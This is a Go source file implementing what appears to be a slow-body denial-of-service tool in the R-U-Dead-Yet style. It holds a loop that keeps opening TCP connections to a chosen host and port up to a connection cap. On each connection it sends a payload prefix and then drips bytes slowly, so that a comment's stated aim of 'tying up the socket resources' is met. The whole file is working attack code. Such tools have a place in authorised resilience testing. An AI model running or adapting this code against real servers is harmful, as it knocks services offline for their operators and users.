package udy

import (
	"fmt"
	"net"
	"time"

	log "github.com/sirupsen/logrus"
)

type defaultUdy struct {
	Provider    DataProvider
	Sender      SendStrategy
	MaxConns    int
	connections int
}

func (l *defaultUdy) Execute(conn net.Conn, prefix []byte, size int) chan bool {
	return l.executeOnConnection(conn, prefix, size)
}

func (l *defaultUdy) ExecuteContinuous(host string, port int, prefix []byte, size int) {
	target := fmt.Sprintf("%s:%d", host, port)

	go l.track()

	for {
		// TODO make configurable
		<-time.After(100 * time.Millisecond)

		if l.connections >= l.MaxConns {
			continue
		}

		logger.WithFields(log.Fields{
			"target": target,
		}).Trace("Establishing connection")
		conn, err := net.Dial("tcp", target)
		if err != nil {
			logger.WithFields(log.Fields{
				"target": target,
			}).Warn("Failed to establish connection")
		} else {
			logger.WithFields(log.Fields{
				"target": target,
				"local":  conn.LocalAddr().String(),
			}).Debug("Established connection")

			go func() {
				<-l.executeOnConnection(conn, prefix, size)
			}()
		}
	}
}

func (l *defaultUdy) track() {
	for {
		logger.Infof("Managing %d connections", l.connections)
		time.Sleep(5 * time.Second)
	}
}

func (l *defaultUdy) executeOnConnection(conn net.Conn, prefix []byte, size int) chan bool {
	closed := make(chan bool)

	go l.send(conn, prefix, size, closed)

	return closed
}

// Note: marks are specific to tthe send strategy implementation. They may relate to the number
// of bytes sent of the number of iterations complete for example.
func (l *defaultUdy) send(conn net.Conn, prefix []byte, endMark int, closed chan bool) {
	l.connections++

	defer func() {
		conn.Close()
		closed <- true
		l.connections--
	}()

	received := make(chan bool)
	go l.monitorConnection(conn, received)

	// Write the payload prefix
	logger.WithFields(log.Fields{
		"prefix": string(prefix),
	}).Trace("Sending prefix")
	if _, err := conn.Write(prefix); err != nil {
		logger.WithFields(log.Fields{
			"prefix": prefix,
			"error":  err,
		}).Error("Failed writing payload prefix")
		return
	}

	currentMark := 0

	var segment []byte

	for currentMark < endMark {
		select {
		case <-received:
			// If we have received data on the connection prematurely return as we are no longer
			// guaranteed to be tying up the socket resources
			logger.WithFields(log.Fields{
				"currentMark": currentMark,
				"endMark":     endMark,
				"remote":      conn.RemoteAddr().String(),
				"local":       conn.LocalAddr().String(),
			}).Warn("Received bytes on socket, ending")
			return
		case <-l.Sender.Wait(currentMark, endMark):
		}

		segment, currentMark = l.Provider.GetNextBytes(currentMark, endMark)
		logger.WithFields(log.Fields{
			"segment":     string(segment),
			"currentMark": currentMark,
		}).Trace("Sending segment")

		if _, err := conn.Write(segment); err != nil {
			logger.WithFields(log.Fields{
				"segment":     segment,
				"currentMark": currentMark,
				"error":       err,
			}).Error("Failed writing payload segment")
			return
		}
	}

	logger.Debug("Payload sent")
}

func (l defaultUdy) monitorConnection(conn net.Conn, done chan<- bool) {
	defer func() { done <- true }()

	read := make([]byte, 1)
	_, err := conn.Read(read)
	if err != nil {
		logger.WithFields(log.Fields{
			"error":  err,
			"remote": conn.RemoteAddr().String(),
			"local":  conn.LocalAddr().String(),
		}).Debug("Error while monitoring connection")
	} else {
		logger.WithFields(log.Fields{
			"remote": conn.RemoteAddr().String(),
			"local":  conn.LocalAddr().String(),
		}).Debug("Received data while monitoring connection")
	}
}
